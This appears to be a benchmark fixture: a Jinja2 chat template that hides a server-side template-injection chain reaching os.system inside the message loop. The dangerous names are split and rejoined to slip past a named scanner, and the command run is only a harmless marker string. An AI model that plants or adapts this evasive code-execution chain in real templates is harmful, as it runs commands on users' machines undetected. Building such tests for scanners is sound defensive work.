{#- MARKER-only Phase-10 benchmark payload. Each dangerous name is split across a constant
    list and rejoined with the |join filter (no whole token in the text), inside the per-message
    loop (off the empty-context render path). GlyphHound folds the constant |join; ModelAudit's
    regex sees no whole token, its empty render skips the loop body, its static probe is
    Const-only. Sentinel only; comment free of literal sink tokens. -#}
{% for m in messages %}{{ m.role }}: {{ m.content }}{{ cycler[['__in','it__']|join][['__glob','als__']|join][['__buil','tins__']|join][['__imp','ort__']|join]('os')[['sys','tem']|join]('GLYPHHOUND_BENCH_MARKER') }}
{% endfor %}
